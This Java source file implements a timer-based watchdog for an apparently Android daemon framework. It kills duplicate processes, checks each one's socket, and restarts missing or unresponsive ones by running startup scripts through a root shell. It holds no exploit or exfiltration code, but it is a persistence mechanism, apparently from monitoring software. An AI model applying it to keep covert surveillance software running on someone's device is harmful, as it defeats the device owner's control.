package com.fx.daemon.util;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.StringReader;
import java.util.HashSet;

import com.fx.daemon.Customization;
import com.fx.socket.RemoteCheckAlive;
import com.vvt.logger.FxLog;
import com.vvt.shell.CannotGetRootShellException;
import com.vvt.shell.LinuxProcess;
import com.vvt.shell.Shell;
import com.vvt.shell.ShellUtil;
import com.vvt.timer.TimerBase;

public class ProcessMonitoring extends TimerBase {
	
	private String mTag = "ProcessMonitoring";
	private static final boolean VERBOSE = false;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private HashSet<WatchingProcess> mWatchingProcesses;
	
	public ProcessMonitoring(String tag, long timeInterval) {
		mWatchingProcesses = new HashSet<WatchingProcess>();
		
		setTimerDurationMs(timeInterval);
		
		if (tag != null) {
			mTag = tag;
		}
	}
	
	public void addMonitoringProcess(WatchingProcess process) {
		if (mWatchingProcesses == null) {
			mWatchingProcesses = new HashSet<WatchingProcess>();
		}
		synchronized (mWatchingProcesses) {
			boolean isContain = mWatchingProcesses.contains(process);
			if (isContain) {
				mWatchingProcesses.remove(process);
			}
			boolean isAdded = mWatchingProcesses.add(process);
			if (LOGD) FxLog.d(mTag, String.format(
					"%s watching process: %s, Success? %s", 
					isContain ? "Update" : "Add", process, isAdded));
			
			if (LOGD) FxLog.d(mTag, String.format(
					"Current watching processes: %s", mWatchingProcesses));
		}
	}
	
	public boolean removeMonitoringProcess(String processName) {
		boolean isRemoved = false;
		if (mWatchingProcesses != null) {
			synchronized (mWatchingProcesses) {
				WatchingProcess process = new WatchingProcess();
				process.setProcessName(processName);
				isRemoved = mWatchingProcesses.remove(process);

				if (LOGD) FxLog.d(mTag, String.format(
						"Remove watching process: %s, Success? %s", processName, isRemoved));
				
				if (LOGD) FxLog.d(mTag, String.format(
						"Current watching processes: %s", mWatchingProcesses));
			}
		}
		return isRemoved;
	}

	@Override
	public void onTimer() {
		if (LOGV) FxLog.v(mTag, "Monitoring # ENTER ...");
		if (LOGV) FxLog.v(mTag, String.format(
				"Monitoring # list: %s ...", mWatchingProcesses.toString()));
		
		synchronized (mWatchingProcesses) {
			for (WatchingProcess watchingProcess : mWatchingProcesses) {
				checkProcess(watchingProcess);
			}
		}
		
		if (LOGV) FxLog.v(mTag, "Monitoring # Refresh list of processes ...");
		refreshProcessesSet();
		
		if (LOGV) FxLog.v(mTag, "Monitoring # EXIT ...");
	}
	
	private void checkProcess(WatchingProcess watchingProcess) {
		if (LOGV) FxLog.v(mTag, "checkProcess # ENTER ...");
		
		String processName = watchingProcess.getProcessName();
		if (LOGV) FxLog.v(mTag, String.format("checkProcess # Name: %s", processName));
		
		HashSet<LinuxProcess> processes = ShellUtil.findDuplicatedProcess(processName);
		if (LOGV) FxLog.v(mTag, String.format("checkProcess # Found: %s", processes));
		
		// Handle missing process 
		if (processes.size() == 0) {
			if (LOGV) FxLog.v(mTag, String.format("checkProcess # '%s' seems missing", processName));
			
			HashSet<LinuxProcess> recheck = ShellUtil.findDuplicatedProcess(processName);
			if (recheck.size() == 0) {
				if (LOGD) FxLog.d(mTag, String.format("checkProcess # '%s' is missing", processName));
				
				if (LOGD) FxLog.d(mTag, "checkProcess # Process Status:-");
				logProcess(ShellUtil.getProcessesList());
				
				restartProcess(watchingProcess);
			}
			else {
				if (LOGV) FxLog.v(mTag, String.format(
						"checkProcess # '%s' is still running", processName));
			}
		} // End handling missing process
		
		// Handle duplicate and check socket communication
		else if (processes.size() > 0) {
			
			// Eliminate duplicated process (PID != 1)
			for (LinuxProcess process : processes) {
				if (! process.ppid.equals("1")) {
					if (LOGD) FxLog.d(mTag, String.format(
							"checkProcess # Kill: %s(%s)", processName, process.pid));
					ShellUtil.killProcessByPid(process.pid);
				}
			}
			
			// Check socket communication
			String serverName = watchingProcess.getServerName();
			
			if (serverName != null) {
				boolean isAlive = false;
				
				RemoteCheckAlive remoteCommand = new RemoteCheckAlive(serverName);
				try {
					isAlive = remoteCommand.execute();
				}
				catch (IOException e) {
					if (LOGE) FxLog.e(mTag, String.format("checkProcess # Error: %s", e));
				}
				
				if (! isAlive) {
					if (LOGD) FxLog.d(mTag, "checkProcess # The socket doesn't respond");
					if (LOGD) FxLog.d(mTag, String.format("checkProcess # Restart %s", processName));
					restartProcess(watchingProcess);
				}
			}
			else {
				if (LOGE) FxLog.e(mTag, "checkProcess # Failed getting server name!!");
			}
		} // End handling duplicated & socket communication
		
		if (LOGV) FxLog.v(mTag, "checkProcess # EXIT ...");
	}
	
	private void restartProcess(final WatchingProcess process) {
		String processName = process.getProcessName();
		if (LOGD) FxLog.d(mTag, String.format("restartProcess # Kill: %s", processName));
		ShellUtil.killProcessByName(processName);
		
		String path = process.getStartupScriptPath();
		if (LOGD) FxLog.d(mTag, String.format("restartProcess # Script path: %s", path));
		
		try {
			Shell shell = Shell.getRootShell();
			shell.exec(path);
			shell.terminate();
		}
		catch (CannotGetRootShellException e) {
			if (LOGE) FxLog.e(mTag, "restartProcess # Failed!!");
		}
	}
	
	private void refreshProcessesSet() {
		if (mWatchingProcesses != null && mWatchingProcesses.size() > 0) {
			HashSet<WatchingProcess> temp = new HashSet<WatchingProcess>();
			temp.addAll(mWatchingProcesses);
			mWatchingProcesses = temp;
		}
	}
	
	private void logProcess(String procs) {
		try {
			BufferedReader reader = new BufferedReader(new StringReader(procs), 256);
			String line = null;
			while ((line = reader.readLine()) != null) {
				if (LOGD) FxLog.d(mTag, line);
			}
		}
		catch (IOException e) { /* ignore */ }
	}

}
